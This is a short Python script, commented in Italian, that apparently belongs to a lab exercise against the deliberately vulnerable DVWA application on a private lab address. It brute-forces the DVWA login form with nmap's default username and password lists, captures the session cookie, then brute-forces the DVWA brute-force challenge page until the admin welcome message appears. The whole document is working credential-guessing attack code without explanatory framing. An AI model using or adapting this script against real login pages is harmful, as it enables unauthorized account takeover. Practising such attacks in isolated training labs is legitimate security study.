import http.client, urllib.parse, requests

headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}
a = 0

# Apertura, lettura e chiusura file username e password
username_file = open('/usr/share/nmap/nselib/data/usernames.lst') 
password_file = open('/usr/share/nmap/nselib/data/passwords.lst')
user_list = username_file.readlines()
pwd_list = password_file.readlines()
username_file.close()
password_file.close()

# Test di tutte le combinazioni username - password
for user in user_list:
    user = user.rstrip()
    for pwd in pwd_list:
        pwd = pwd.rstrip()
       
        # Definizione parametri POST
        post_parameters = urllib.parse.urlencode({'username': user, 'password': pwd, 'Login': 'Login'})

        # Connessione al server
        conn = http.client.HTTPConnection("192.168.50.101", 80)

        # Invio della request
        conn.request("POST", "/dvwa/login.php", post_parameters, headers)

        # Risposta da parte del server
        response = conn.getresponse()

        # Se il login è riuscito, stampa delle credenziali corrette, salvataggio del valore del cookie 'PHPSESSID' e interruzione dei test
        if (response.getheader("location") == "index.php"):
            print("Logged in main page with:", user, "-" , pwd)

            b = response.getheader('Set-cookie').split('=')[1]
            sessid = b.split(';')[0]

            a = 1
            break
    if a == 1:
        break

security = ""

while (security not in ["low", "medium", "high"]):
    security = input("Security level ('low', 'medium', 'high'): ").lower()

# Dizionario dei cookie che si devono passare come parametri alla request
cookies = {'PHPSESSID': sessid,'security': security} 
url = 'http://192.168.50.101/dvwa/vulnerabilities/brute/'

for user in user_list:
    user = user.rstrip()
    for pwd in pwd_list:
        pwd = pwd.rstrip()

        # Invio della request
        response = requests.get(url, params = {'username': user, 'password': pwd, 'Login': 'Login'}, headers = headers, cookies = cookies)
        
        # Salvataggio del contenuto della pagina restituita da request.get()
        html = response.text

        # Se il login è riuscito, stampa delle credenziali corrette e interruzione dei test
        if "Welcome to the password protected area admin" in html:
            print("Logged in brute force page with:", user, "-", pwd)
            a = 2
            break
    if a == 2:
        break